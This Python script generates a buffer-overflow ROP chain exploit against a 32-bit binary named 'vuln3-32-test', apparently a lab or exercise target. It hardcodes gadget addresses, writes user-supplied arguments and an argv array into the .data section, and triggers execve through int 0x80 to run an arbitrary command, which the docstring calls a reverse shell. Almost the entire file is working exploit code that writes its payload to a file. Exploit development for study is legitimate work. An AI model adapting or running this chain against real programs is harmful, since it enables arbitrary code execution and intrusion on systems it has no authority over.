import junk_length_and_addresses
import address_pop
from struct import pack
import os

# Macro definitions for ROP Gadgets
POPEDX    = pack('<I', 0x0806ee8b) # pop edx ; ret
POPEAX    = pack('<I', 0x080a8bf6) # pop eax ; ret
ADDEAXEDX = pack('<I', 0x08068103) # add eax, edx ; ret

MOVISTACK = pack('<I', 0x08056d05) # mov dword ptr [edx], eax ; ret
XOREAX    = pack('<I', 0x080562c0) # xor eax, eax ; ret
INCEAX    = pack('<I', 0x0807c32a) # inc eax ; ret
INCEBX    = pack('<I', 0x0805e36b) # inc ebx ; ret

INCECX    = pack('<I', 0x080c48f9) # inc ecx ; ret
DECEDX    = pack('<I', 0x080cfad4) # dec edx ; ret
INT80     = pack('<I', 0x08049603) # int 0x80
NOP       = pack('<I', 0x0804876c) # nop
POPEBX    = pack('<I', 0x080481c9) # pop ebx ; ret
POPECXEBX = pack('<I', 0x0806eeb2) # pop ecx ; pop ebx ; ret

def preprocess(p):
    """Helper function to preprocess command line arguments w.r.t. /

    :param p: The parameter to be preprocessed
    :return: The preprocessed command line argument
    """
    if '/' in p:
        result = ""
        subargs = p.split('/')
        for subarg in subargs:
            if subarg:
                while len(subarg) < 3:
                    subarg = '/' + subarg
                result += '/' + subarg
        return result
    return p

def create_stack_ropchain(cli_args, base_address):
    """Create the stack ROP chain

    :param cli_args: The command line arguments
    :param base_address: The base .data address
    :return: The stack ROP chain packed bytes sequence
    """
    p = b''

    offset = 0
    size = len(cli_args)
    for index in range(size):
        if index > 0:
            offset += len(cli_args[index - 1]) + 1
        
        for j in range(len(cli_args[index]) // 4):
            p += address_pop.pop_reg(base_address + offset + j * 4,POPEDX,0,DECEDX,"dec")

            p += POPEAX
            p += (cli_args[index][j * 4 : (j + 1) * 4]).encode('utf-8')
            p += MOVISTACK
        
        p += address_pop.pop_reg(base_address + offset + len(cli_args[index]),POPEDX,0,DECEDX,"dec")

        p += XOREAX
        p += MOVISTACK
    
    return p


def create_shadow_stack_ropchain(cli_args, base_address, shadow_stack_offset):
    """Create the shadow stack ROP chain

    :param cli_args: The command line arguments
    :param base_address: The base .data address
    :param shadow_stack_offset: The offset used from the .data address to create the shadow stack
    :return: The shadow stack ROP chain packed bytes sequence
    """
    p = b''

    args_offset = 0
    shadow_offset = 0
    size = len(cli_args)
    
    for index in range(size):
        p += address_pop.pop_reg(base_address + args_offset,POPEAX,POPEDX,ADDEAXEDX,"add")
        p += address_pop.pop_reg(base_address + shadow_stack_offset + shadow_offset,POPEDX,0,DECEDX,"dec")
        p += MOVISTACK

        shadow_offset += 4
        args_offset += len(cli_args[index]) + 1
    
    return p

def rop_exploit(cli_args, base_address):
    """Create the full ROP chain reverse shell exploit

    :param cli_args: The command line arguments
    :param base_address: The base .data address
    :return: The full ROP chain reverse shell exploit packed bytes sequence
    """
    (padding, data, bss) = junk_length_and_addresses.get_everything("vuln3-32-test")
    data += 160 #Data now starts at 0
    print(f"{data:x}")
    STACK     = pack('<I', data)
    exploit = b'\x41' * padding

    exploit += create_stack_ropchain(cli_args,data)
    exploit += address_pop.pop_reg(data,POPEBX,0,INCEBX,"inc")
    exploit += create_shadow_stack_ropchain(cli_args,data,60)
    

    exploit += address_pop.pop_reg(data + 60,POPECXEBX,0,INCECX,"inc")
    # exploit += address_pop.pop_reg(data,NOP,0,INCEBX,"inc")
    exploit += pack('<I', 0x01020304) # padding without overwrite ebx
    exploit += address_pop.pop_reg(data,POPEBX,0,INCEBX,"inc")

    exploit += address_pop.pop_reg(data + 48,POPEDX,0,DECEDX,"dec")

    exploit += XOREAX # xor eax, eax ; ret
    exploit += INCEAX * 11 # inc eax ; ret 11 times
    exploit += INT80 # int 0x80
    return exploit

def test():
    params = input("Enter exploit parameters: ")
    args = []
    for arg in params.split():
        args.append(preprocess(arg))

    fileName=input("Enter the file name: ")
    outfile=open(fileName, "wb")
    outfile.write(rop_exploit(args, 0x080da060))
    outfile.close()


if __name__ == "__main__":
    test()